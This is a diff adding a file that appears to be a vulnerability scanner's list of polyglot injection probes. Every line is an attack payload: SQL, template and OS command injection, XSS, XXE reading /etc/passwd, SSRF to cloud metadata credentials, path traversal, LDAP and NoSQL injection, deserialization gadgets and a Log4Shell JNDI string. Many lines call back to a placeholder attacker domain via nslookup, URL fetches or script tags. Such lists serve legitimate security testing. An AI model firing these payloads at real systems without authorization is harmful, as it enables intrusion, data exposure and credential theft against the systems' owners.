@@ -1,0 +1,62 @@
+'AND 1=CONVERT(int,@@version)--/*'OR 1=extractvalue(1,concat(0x7e,version()))--*/\"OR CAST(version() AS int)--
+'UNION SELECT 7*191--/*'UNION SELECT 7*191,7*191--*/\"UNION SELECT 7*191,7*191,7*191--
+SLEEP(5)/*'XOR(IF(1=1,SLEEP(5),0))OR'\"XOR(IF(1=1,SLEEP(5),0))OR\"*/
+';EXEC master..xp_dirtree '\\\\{domain}\\a'--/*'OR LOAD_FILE('\\\\\\\\{domain}\\\\a')OR'*/\"OR(SELECT dblink_send_query('host={domain}','SELECT 1'))--
+{{7*191}}${7*191}<%= 7*191 %>${{7*191}}#{7*191}#set($x=7*191)$x[=7*191]@(7*191)
+${{<%[%'\"}}%\\
+{{__import__('time').sleep(5)}}${T(java.lang.Thread).sleep(5000)}<%= sleep(5) %>${{T(java.lang.Thread).sleep(5000)}}
+{{__import__('urllib.request').request.urlopen('http://{domain}/ssti')}}${T(java.net.URL).new('http://{domain}/ssti').openStream()}<%= require('net/http');Net::HTTP.get(URI('http://{domain}/ssti')) %>
+;sleep 5 #'|sleep 5|\"$(sleep 5)`sleep 5`
+;echo $((7*191)) #'|expr 7 \\* 191|\"$(echo $((7*191)))`expr 7 \\* 191`
+;nslookup {domain} #'|nslookup {domain}|\"$(nslookup {domain})`nslookup {domain}`
+7*191
+__import__('time').sleep(5)
+__import__('urllib.request').request.urlopen('http://{domain}/pyeval')
+'\"><img src=x onerror=alert(1337)><!--
+'\"><script src=//{domain}/x.js></script><img src=//{domain}/x onerror=alert(1337)><!--
+<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>
+<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{domain}/xxe\">]><foo>&xxe;</foo>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://{domain}/ssrf
+../../../../../../../etc/passwd
+return 7*191
+{\"$gt\":\"\",\"$ne\":\"\"}
+${7*191}
+{\"__proto__\":{\"polluted\":1337}}
+%0d%0aX-Injected:1337%0d%0a
+%s%s%s%s%s%s%s%s%s%s
+<!--#set var=\"x\" value=\"1337\" --><!--#echo var=\"x\" -->
+*)(cn=*))(|(cn=*
+*)(uid=1337)(&(objectClass=*
+<xsl:value-of select=\"7*191\"/>
+<xsl:value-of select=\"document('http://{domain}/xslt')\"/>
+<xsl:invalid/>
+{\"query\":{\"invalid_query_type\":{}}}
+{\"script_fields\":{\"x\":{\"script\":\"7*191\"}}}
+' OR 1=1 RETURN 7*191 //
+' OR 1=1 WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
+{\"selector\":{\"$invalid_op\":\"test\"}}
+new GroovyShell().evaluate('7*191')
+Thread.sleep(5000)
+new URL('http://{domain}/groovy').text
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnMS8wJwp0Ui4=
+!!python/object/apply:builtins.eval [\"1/0\"]
+{\"py/reduce\":[{\"py/function\":\"builtins.eval\"},{\"py/tuple\":[\"1/0\"]}]}
+{\"rce\":\"_$$ND_FUNC$$_function(){throw new Error(1337)}()\"}
+!!invalid_tag_probe 1337
+{\"__js\":\"throw new Error(1337)\"}
+O:9999:\"NonExist\":0:{}
+--- !ruby/object:NonExistentClass1337\\ni: x
+BAj/AAAA
+{\"^o\":\"Gem::Requirement\",\"requirements\":{\"^o\":\"Gem::DependencyList\"}}
+C_hessianRldap://{domain}/a
+cHN0MP///wQA
+--- {{{invalid yaml 1337
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==
+!!com.nonexistent.FakeClass1337 {}
+[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"yv66vg==\"],\"transletName\":\"a\",\"outputProperties\":{}}]
+{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vg==\"],\"_name\":\"a\",\"_tfactory\":{},\"_outputProperties\":{}}
+<java.lang.ProcessBuilder><command><string>nslookup</string><string>{domain}</string></command></java.lang.ProcessBuilder>
+<java version=\"1.8.0\" class=\"java.beans.XMLDecoder\"><object class=\"com.nonexistent.Fake1337\"/></java>
+{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\",\"MethodName\":\"Start\",\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\",\"StartInfo\":{\"$type\":\"System.Diagnostics.ProcessStartInfo, System\",\"FileName\":\"nslookup\",\"Arguments\":\"{domain}\"}}}
+${jndi:ldap://{domain}/a}
